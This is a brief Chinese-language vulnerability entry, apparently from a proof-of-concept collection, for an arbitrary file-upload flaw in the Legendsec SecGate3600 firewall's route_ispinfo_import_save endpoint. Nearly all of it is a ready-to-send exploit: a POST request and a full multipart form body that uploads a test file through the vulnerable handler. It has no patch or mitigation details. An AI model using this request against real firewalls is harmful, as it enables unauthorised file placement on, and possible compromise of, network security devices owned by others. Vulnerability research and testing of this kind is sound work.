# 网神SecGate3600防火墙route_ispinfo_import_save文件上传漏洞

网神SecGate3600防火墙route_ispinfo_import_save ｜ 文件上传 ｜ —
- **请求**：`POST /?g=route_ispinfo_import_save HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"
10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile"; filename="123.txt"
Content-Type: text/plain
123
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
route_ispinfo_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```